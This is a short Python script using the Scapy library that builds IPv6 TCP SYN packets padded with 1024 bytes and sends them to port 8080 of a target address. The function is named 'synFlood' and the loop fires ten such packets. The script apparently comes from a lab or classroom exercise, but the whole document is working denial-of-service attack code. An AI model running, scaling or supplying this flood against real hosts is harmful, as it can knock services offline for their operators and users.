from scapy.all import *

def synFlood(src,tgt):
    L3=IPv6(src=src,dst=tgt)
    L4=TCP(sport=RandShort(),dport=8080, flags="S")
    raw = Raw(b"X"*1024)
    pkt=L3/L4/raw
    send(pkt)


src="2001:18::2"
tgt="2001:1::3"

for i in range(10):
 synFlood(src,tgt)